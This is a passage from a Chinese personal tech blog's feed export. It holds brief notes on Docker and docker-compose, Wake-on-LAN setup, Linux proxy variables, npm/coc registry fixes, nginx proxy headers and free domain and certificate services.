class="headerlink" title="使容器阻塞运行"></a>使容器阻塞运行</h1><p>利用 <code>-it</code> 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -dit alpine<br></code></pre></td></tr></table></figure><h1 id="利用-link-映射域名"><a href="#利用-link-映射域名" class="headerlink" title="利用 --link 映射域名"></a>利用 <code>--link</code> 映射域名</h1><p>在运行一个容器时, 用 <code>--link</code> 可以将另一个容器的 ip 映射为一个域名并添加到 <code>/etc/hosts</code> 文件中.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -dit --<span class="hljs-built_in">link</span> another_container:domain_name alpine<br></code></pre></td></tr></table></figure><p>这里就将 <code>another_container</code> 的 IP 映射为 <code>domain_name</code> 这个域名.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-ffmpeg</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-ffmpeg/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-ffmpeg/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-docker-build-指定-Dockerfile-文件名的坑</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-docker-build-%E6%8C%87%E5%AE%9A-Dockerfile-%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E5%9D%91/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-docker-build-%E6%8C%87%E5%AE%9A-Dockerfile-%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<p>应为:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker build -t somatag -f /path/to/file .<br></code></pre></td></tr></table></figure><p>注意最后还有一个 <code>.</code></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Dockerfile-ADD-指令注意</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-Dockerfile-ADD-%E6%8C%87%E4%BB%A4%E6%B3%A8%E6%84%8F/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-Dockerfile-ADD-%E6%8C%87%E4%BB%A4%E6%B3%A8%E6%84%8F/</url>
    
    <content type="html"><![CDATA[<p>只能作用于当前环境, 不能用 <code>..</code> 表示上一级目录.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-docker-compose-build</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-docker-compose-build/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-docker-compose-build/</url>
    
    <content type="html"><![CDATA[<p>似乎只要 <code>build</code> 之后就不用特定制定一个 <code>image</code>.</p><p>若不指定 build 之后镜像的名称, 默认为:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">当前目录<span class="hljs-literal">_</span>服务名<br></code></pre></td></tr></table></figure><p>如:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">services:</span> <br><span class="hljs-symbol">  pages:</span><br><span class="hljs-symbol">    build:</span><br><span class="hljs-symbol">      context:</span> .<br><span class="hljs-symbol">      dockerfile:</span> nginx_pages<br><span class="hljs-symbol">    container_name:</span> <span class="hljs-string">&quot;pages&quot;</span><br><span class="hljs-symbol">    command:</span> nginx<br><br></code></pre></td></tr></table></figure><p>就改为: <code>当前目录名_pages</code>. 似乎不能指定镜像名.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-docker-run-的时候的-p参数</title>
    <link href="/2022/10/06/%E5%85%B3%E4%BA%8E-docker-run-%E7%9A%84%E6%97%B6%E5%80%99%E7%9A%84-p%E5%8F%82%E6%95%B0/"/>
    <url>/2022/10/06/%E5%85%B3%E4%BA%8E-docker-run-%E7%9A%84%E6%97%B6%E5%80%99%E7%9A%84-p%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>如果不用 <code>-p</code> 或 <code>-P</code> 参数的话, 容器内部的 ports 不会自动映射到宿主机的端口上, 但是可以利用容器自身的 ip 访问.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark-网络分析就是这么简单</title>
    <link href="/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95/"/>
    <url>/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E5%B0%B1%E6%98%AF%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h1 id="初试锋芒"><a href="#初试锋芒" class="headerlink" title="初试锋芒"></a>初试锋芒</h1><h2 id="从一道面试题说起"><a href="#从一道面试题说起" class="headerlink" title="从一道面试题说起"></a>从一道面试题说起</h2><p><code>Interface</code> 界面是选择从哪一张网卡抓包.</p><p>跨子网的通信需要默认网关的转发. 要和默认网关通信, 需要获得其 MAC 地址.</p><p>Wireshark 会将 MAC 中前三个表示厂商的字节直接显示成厂商名.</p><p>发出 ping 包, 就是发出 ICMP 数据包.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark-网络分析艺术-Notes</title>
    <link href="/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E8%89%BA%E6%9C%AF-Notes/"/>
    <url>/2022/10/05/Wireshark-%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90%E8%89%BA%E6%9C%AF-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.tcpipguide.com/free/index.html">http://www.tcpipguide.com/free/index.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-Wake-on-LAN</title>
    <link href="/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-Wake-on-LAN/"/>
    <url>/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-Wake-on-LAN/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/wake-on-LAN">参考1 百度百科</a></p><p><a href="https://wiki.archlinux.org/title/Wake-on-LAN">参考2 Archwiki</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Wake-On-LAN 是一种电源管理功能. 如果存在网络活动, 则允许设备将操作系统从待机或休眠模式中唤醒.</p><p>Wake-On-LAN 的实现, 主要是向目标主机发送特殊格式的数据包.</p><p>也就是说, 通过让网卡处于待机状态, 当网卡接受到特定命令后, 就唤醒主机.</p><h1 id="硬件设置"><a href="#硬件设置" class="headerlink" title="硬件设置"></a>硬件设置</h1><p>需要 motherboard (主板) 和 Network Interface Controller (网卡) 的支持.</p><p>需要在 BIOS 中 enable Wake-on-LAN 功能.</p><h1 id="软件配置"><a href="#软件配置" class="headerlink" title="软件配置"></a>软件配置</h1><h2 id="enable-网卡上的-WoL"><a href="#enable-网卡上的-WoL" class="headerlink" title="enable 网卡上的 WoL"></a>enable 网卡上的 WoL</h2><p>WoL 可能是默认关闭的.</p><p>安装 <code>ethtool</code> 来查看设置.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ethtool interface | grep Wake-on<br><br>Supports Wake-on: pumbag<br>Wake-on: d<br></code></pre></td></tr></table></figure><p><code>Wake-on</code> 的值决定 wake up 的活动:</p><ul><li><code>d</code>, disabled</li><li><code>p</code>, PHY activity</li><li><code>u</code>, unicast activity</li><li><code>m</code>, multicast activity</li><li><code>b</code>, broadcast activity</li><li><code>a</code>, ARP activity</li><li><code>g</code>, magic packet activity</li></ul><p>需要设置为 <code>g</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ethtool -s interface wol g<br></code></pre></td></tr></table></figure><h2 id="持续生效-Make-it-persistent"><a href="#持续生效-Make-it-persistent" class="headerlink" title="持续生效 Make it persistent"></a>持续生效 Make it persistent</h2><p>在 network 的链接文件中添加 <code>WakeOnLan</code>:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/etc/systemd/network/50-wired.link<br><br>[Match]<br><span class="hljs-attribute">MACAddress</span>=aa:bb:cc:dd:ee:ff<br><br>[Link]<br><span class="hljs-attribute">NamePolicy</span>=kernel database onboard slot path<br><span class="hljs-attribute">MACAddressPolicy</span>=persistent<br><span class="hljs-attribute">WakeOnLan</span>=magic<br></code></pre></td></tr></table></figure><p>可以在 <code>systemd.link(5)</code> 中查看更多信息.</p><h1 id="提供-Wake-On-Lan-服务的软件"><a href="#提供-Wake-On-Lan-服务的软件" class="headerlink" title="提供 Wake-On-Lan 服务的软件"></a>提供 Wake-On-Lan 服务的软件</h1><p>在树霉派上安装 Wiki 上推荐的三款之一, 通过 <code>wget</code> 获取压缩包, 并解压:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://udomain.dl.sourceforge.net/project/wake-on-lan/wol/0.7.1/wol-0.7.1.tar.gz<br>$ tar -zxvf wol-0.7.1.tar.gz<br></code></pre></td></tr></table></figure><p>之后按照其目录下的 INSTALL 文件要求安装即可.</p><p>使用这个软件需要指定 9 端口以及 MAC 地址:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wol -p 9 MAC<br></code></pre></td></tr></table></figure><h1 id="参考-B-站"><a href="#参考-B-站" class="headerlink" title="参考 B 站"></a><a href="https://www.bilibili.com/video/BV1FA411t74H/?spm_id_from=333.880.my_history.page.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站</a></h1><p>一个是需要进入 BIOS 开启网卡唤醒功能, 一个是需要设置路由器, 一个是使用 UDP 协议. </p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-中关于-Proxy-server</title>
    <link href="/2022/10/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Proxy-server/"/>
    <url>/2022/10/05/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Proxy-server/</url>
    
    <content type="html"><![CDATA[<h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>如:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=http://10.203.0.1:5187/<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">ftp_proxy</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">rsync_proxy</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,localaddress,.localdomain.com&quot;</span><br></code></pre></td></tr></table></figure><p>wget, pacman, curl 等命令会基于这种形式的环境变量来确定一个给定的网络协议.</p><h1 id="使用-proxyman-git-工具配置系统代理"><a href="#使用-proxyman-git-工具配置系统代理" class="headerlink" title="使用 proxyman-git 工具配置系统代理"></a>使用 proxyman-git 工具配置系统代理</h1><h1 id="通过-sudo-保持代理"><a href="#通过-sudo-保持代理" class="headerlink" title="通过 sudo 保持代理"></a>通过 sudo 保持代理</h1><p>在 sudo 配置文件中添加:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>sudoers.d/<span class="hljs-number">05</span>_proxy<br><br>Defaults env_keep += <span class="hljs-string">&quot;*_proxy *_PROXY&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>申请免费域名和证书</title>
    <link href="/2022/10/05/%E7%94%B3%E8%AF%B7%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E5%92%8C%E8%AF%81%E4%B9%A6/"/>
    <url>/2022/10/05/%E7%94%B3%E8%AF%B7%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E5%92%8C%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="申请免费域名"><a href="#申请免费域名" class="headerlink" title="申请免费域名"></a>申请免费域名</h1><p>使用 <a href="https://www.freenom.com/zh/index.html?lang=zh">freenom</a> 这个网站.</p><p>注意:</p><ul><li>免费是指无需支付首年的费用, 一年后域名到期不续费会被回收</li><li>注册必须准备一个可访问的电子邮箱, 用于接受验证邮件并向 ICANN 登记</li></ul><h1 id="申请免费证书"><a href="#申请免费证书" class="headerlink" title="申请免费证书"></a>申请免费证书</h1><p><a href="https://b23.tv/nSbXQRY">参考</a><br>使用 <a href="https://freessl.cn/">freessl</a> 这个网站.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cloudflare-代理域名</title>
    <link href="/2022/10/05/Cloudflare-%E4%BB%A3%E7%90%86%E5%9F%9F%E5%90%8D/"/>
    <url>/2022/10/05/Cloudflare-%E4%BB%A3%E7%90%86%E5%9F%9F%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/Xnc08DW">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-md5</title>
    <link href="/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-md5/"/>
    <url>/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-md5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/qGygGTo">参考</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>MD5 是一种哈希算法.</p><p>用于:</p><ul><li>密码保护</li><li>检验文件完整性</li><li>数字签名</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决-npm-在设置了-proxy-之后无法使用</title>
    <link href="/2022/10/05/%E8%A7%A3%E5%86%B3-npm-%E5%9C%A8%E8%AE%BE%E7%BD%AE%E4%BA%86-proxy-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/05/%E8%A7%A3%E5%86%B3-npm-%E5%9C%A8%E8%AE%BE%E7%BD%AE%E4%BA%86-proxy-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>取消掉设置就行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">unset</span> http_proxy<br>$ <span class="hljs-built_in">unset</span> https_proxy<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决-coc-下载问题</title>
    <link href="/2022/10/05/%E8%A7%A3%E5%86%B3-coc-%E4%B8%8B%E8%BD%BD%E9%97%AE%E9%A2%98/"/>
    <url>/2022/10/05/%E8%A7%A3%E5%86%B3-coc-%E4%B8%8B%E8%BD%BD%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>应该说是暂时解决, 找到一个 npm 的源:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>skimdb.npmjs.com<span class="hljs-regexp">/registry/</span><br></code></pre></td></tr></table></figure><p>在 <code>~/.npmrc</code> 中添加这个源:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">coc.nvim:registry=https:<span class="hljs-regexp">//</span>skimdb.npmjs.com<span class="hljs-regexp">/registry/</span><br></code></pre></td></tr></table></figure><p>其他好多源都不行.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CoC-换源</title>
    <link href="/2022/10/05/CoC-%E6%8D%A2%E6%BA%90/"/>
    <url>/2022/10/05/CoC-%E6%8D%A2%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<p>原本以为直接切换 npm 或 yarn 的源就可以了, 结果发现并没有切换成功:<br><img src="/../img/fail_change_source.png" alt="fail"></p><p>从这里可以看出 <code>https://registry.npmjs.org</code> 还是原来的源.</p><p>查阅源代码文档</p><p><img src="/../img/.png" alt="coc-registry"></p><p>发现需要修改 <code>~/.npmrc</code> 文件.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决-CocConfig-找不到配置文件问题</title>
    <link href="/2022/10/05/%E8%A7%A3%E5%86%B3-CocConfig-%E6%89%BE%E4%B8%8D%E5%88%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%97%AE%E9%A2%98/"/>
    <url>/2022/10/05/%E8%A7%A3%E5%86%B3-CocConfig-%E6%89%BE%E4%B8%8D%E5%88%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>:CocConfig</code> 这个命令时总会报错, 之后就去查看了源代码:<br><img src="/../img/cocconfig.png" alt="源代码"></p><p>发现读取了 <code>VIMCONFIG</code> 这个环境变量, 因此去查看这个环境变量的设置, 确实设置有误.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-cloudflare</title>
    <link href="/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-cloudflare/"/>
    <url>/2022/10/05/%E4%BB%80%E4%B9%88%E6%98%AF-cloudflare/</url>
    
    <content type="html"><![CDATA[<p>Cloudflare 是一家公司.</p><p>Cloudflare 可以提供网络安全服务.</p><p>Cloudflare 可以提供网页的浏览速度.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-nginx-upstream-利用域名访问</title>
    <link href="/2022/10/05/%E5%85%B3%E4%BA%8E-nginx-upstream-%E5%88%A9%E7%94%A8%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE/"/>
    <url>/2022/10/05/%E5%85%B3%E4%BA%8E-nginx-upstream-%E5%88%A9%E7%94%A8%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/wx370092877/article/details/126168956">参考2</a><br>nginx 在做代理转发时, 会自行对前段请求头进行处理, 并根据处理结果, 向服务器发送请求.</p><p>对照反向代理指令和一些内置变量来配置:<br><img src="/../img/reverse_proxy.png" alt="反向代理"></p><h2 id="proxy-set-header"><a href="#proxy-set-header" class="headerlink" title="proxy_set_header"></a>proxy_set_header</h2><p><a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_set_header">官方文档</a><br>主要讲一下这个 <code>Host</code> 这是 <code>Request Headers</code> 里面的一个 field (字段):<br><img src="/../img/Host.png" alt="Host"></p><p><code>proxy_set_header</code> 第一个参数为 field, 第二个参数为这个 field 的值.</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">proxy_set_header</span> <span class="hljs-meta">field</span> value<br></code></pre></td></tr></table></figure><p>这个指令不需要和 <code>proxy_pass</code> 配合使用.</p><h2 id="常用内置变量"><a href="#常用内置变量" class="headerlink" title="常用内置变量"></a>常用内置变量</h2><p><a href="https://blog.csdn.net/aiwangtingyun/article/details/120337434">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker-compose-部分笔记</title>
    <link href="/2022/10/05/docker-compose-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/05/docker-compose-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/docker/docker-compose.html">菜鸟教程 docker-compose</a><br><a href="https://docs.docker.com/compose/compose-file/#networks-top-level-element">官网</a></p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="version-指令"><a href="#version-指令" class="headerlink" title="version 指令"></a>version 指令</h2><p>指定从 compose 的哪个版本开始制定.</p><h2 id="yml-配置中的-build-指令"><a href="#yml-配置中的-build-指令" class="headerlink" title="yml 配置中的 build 指令"></a>yml 配置中的 build 指令</h2><p>如:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">build:</span><br><span class="hljs-symbol">    context:</span><br><span class="hljs-symbol">    dockerfile:</span><br><span class="hljs-symbol">    args:</span><br><span class="hljs-symbol">    labels:</span><br><span class="hljs-symbol">    target:</span><br></code></pre></td></tr></table></figure><p><code>contest</code> 指明目录所在位置.</p><p><code>dockerfile</code> 指定构建镜像的 Dockerfile 文件名.</p><p><code>args</code> 指明构建参数.</p><p><code>labels</code> 设置构建镜像的标签.</p><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><p>覆盖容器启动的默认命令.<br>如:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">command:</span> [<span class="hljs-string">&quot;bundle&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>]<br></code></pre></td></tr></table></figure><h2 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h2><p>指定容器名称:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">container_name:</span> name<br></code></pre></td></tr></table></figure><h2 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h2><p>设置依赖关系:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">service</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>        <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>    <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>    <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres</span><br></code></pre></td></tr></table></figure><h1 id="关于-networks"><a href="#关于-networks" class="headerlink" title="关于 networks"></a>关于 networks</h1><p>这个 <code>networks</code> 是和 <code>services</code> 是写在同一个层级的, 其作用是创建网络, 如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs docker-compose">services:<br>  frontend:<br>    image: awesome/webapp<br>    networks:<br>      - front-tier<br>      - back-tier<br><br>networks:<br>  front-tier:<br>  back-tier:<br></code></pre></td></tr></table></figure><p>这是官方的例子, 这里创建了两个网络 <code>front-tier</code> 和 <code>back-tier</code>, <code>frontend</code> 这个服务也通过 <code>networks</code> 来加入网络.</p><p><code>ipam</code> 是 IP Address Management, is the administration of DNS and DHCP. IPAM 是 planning, tracking, and managing the Internet Protocol address space used in network. 大致就是说用来管理 IP 地址.</p><p>Compose implementations 必须要提供 external connectivity to networks.</p><h1 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h1><p><a href="https://www.jianshu.com/p/3004fbce4d37">参考1</a><br><a href="https://juejin.cn/post/6844903976534540296">参考2 含 docker-compose.yml 的详细解释</a><br>容器在创建时, 分配的 ip 可能不在一个网段内.</p><p>指定容器名称要用 <code>container_name</code>, 否则默认名称为:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">当前目录名称<span class="hljs-emphasis">_service下的服务名称_</span>数字    <br></code></pre></td></tr></table></figure><p>这个数字的规律暂时不清楚.</p><p>指定 networks 的名称:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">networks:</span><br><span class="hljs-symbol">  A_Network:</span><br><span class="hljs-symbol">    name:</span> this_is_the_name<br></code></pre></td></tr></table></figure><p>利用 <code>name</code> 这个键值对.</p><p>如果不自定义 networks, docker 自己添加的 network 名称为:</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">目录名<span class="hljs-number">_</span><span class="hljs-keyword">default</span><br></code></pre></td></tr></table></figure><p>如果是自定义, 如上面的 <code>A_Network</code>, 则名称为:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">目录名_<span class="hljs-built_in">A_Network</span><br></code></pre></td></tr></table></figure><p>若是添加了 name 键值对, 则为:</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>the<span class="hljs-number">_n</span>ame<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Nginx-打开的-html-页面没有被-js-和-css-渲染</title>
    <link href="/2022/10/05/%E5%85%B3%E4%BA%8E-Nginx-%E6%89%93%E5%BC%80%E7%9A%84-html-%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E8%A2%AB-js-%E5%92%8C-css-%E6%B8%B2%E6%9F%93/"/>
    <url>/2022/10/05/%E5%85%B3%E4%BA%8E-Nginx-%E6%89%93%E5%BC%80%E7%9A%84-html-%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E8%A2%AB-js-%E5%92%8C-css-%E6%B8%B2%E6%9F%93/</url>
    
